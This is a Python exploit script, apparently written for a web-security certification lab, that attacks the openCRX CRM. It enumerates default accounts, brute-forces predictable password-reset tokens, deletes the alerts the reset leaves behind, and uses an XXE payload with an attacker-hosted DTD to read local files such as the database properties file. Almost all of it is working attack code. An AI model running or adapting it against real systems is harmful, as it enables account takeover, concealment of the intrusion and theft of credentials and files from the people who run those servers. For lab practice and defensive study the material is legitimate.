import time
import base64
import re
import json
import subprocess
import httpx
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
        proxies=proxy,
)

# Config
TARGET_IP = "opencrx" # add entry in /etc/hosts
TARGET_PORT = "8080"
ATTACKER_IP = "192.168.45.209"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/opencrx-core-CRX/"

default_creds = [
    "guest",
    "admin-Standard",
    "admin-Root"
]

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()
        self.wfile.write(b"<!ENTITY wrapper \"%start;%file;%end;\">");

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)
    return server

def find_username():
    for id in default_creds:
        data = {"id": id}
        res = client.post(f"{URL}RequestPasswordReset.jsp", data=data)
        
        if "Password reset request successful for " in res.text:
            print(f"[+] User found: {id}")
            return id

def request_password_reset(username):
    seed_start = round(time.time() * 1000)
    data = {"id": username}
    res = client.post(f"{URL}RequestPasswordReset.jsp", data=data)
    assert res.status_code == 200
    seed_end = round(time.time() * 1000)

    print(f"Seed generated: {seed_start} ~ {seed_end}")

    process = subprocess.Popen(f"java OpenCRXToken {str(seed_start)} {str(seed_end)}",
                               shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    tokens = list(set(stdout.decode().split("\n")))
    return tokens

def bruteforce_tokens(username, tokens):
    for t in tokens:
        data = {
            "t": t,
            "p": "CRX",
            "s": "Standard",
            "id": username,
            "password1": "Awae1234",
            "password2": "Awae1234",
        }
        res = client.get(f"{URL}PasswordResetConfirm.jsp", params=data)

        if "Password successfully changed for" in res.text:
            print("[+] Successfully reset password: Awae1234!")
            return 
def delete_password_reset_alert(username, password):
    api_url = f"http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert"
    basic_cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    header = {
        "Authorization": f"Basic {basic_cred}",
        "Accept": "application/json"
    }
    res = client.get(api_url, params={"size":100}, headers=header)
    
    if int(res.json()["@total"]) > 0:
        for j in res.json()["objects"]:
            id = j["@href"].split("/")[-1]
            res = client.delete(f"{api_url}/{id}", headers=header)
            assert res.status_code == 204

def execute_xxe_attack(username, password, xml):
    api_url = f"http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
    basic_cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    header = {
        "Authorization": f"Basic {basic_cred}",
        "Accept": "application/json",
        "Content-Type": "text/xml"
    }

    return client.post(api_url, content=xml.encode(), headers=header)

def extract_local_file(filepath):
    xml = f"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file://{filepath}">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://{ATTACKER_IP}:{HTTPSERVER_PORT}/">
  %dtd;
]>
<org.opencrx.kernel.account1.Contact><lastName>&wrapper;</lastName></org.opencrx.kernel.account1.Contact>
"""

    res = execute_xxe_attack("guest", "Awae1234", xml)
    if res.status_code == 200:
        return res.json()["fullName"]
    else:
        assert res.json()["element"][2]["parameter"]["_item"][2]["$"]
        result = res.json()["element"][2]["parameter"]["_item"][2]["$"]
        return result.split(", ")[14]

if __name__ == "__main__":
    server = run_background_http_server()
    #username = find_username()
    #tokens = request_password_reset(username)
    #bruteforce_tokens(username, tokens)
    #delete_password_reset_alert(username, "Awae1234")
    print(extract_local_file("/home/student/crx/data/hsqldb/crx.properties"))

    server.shutdown()

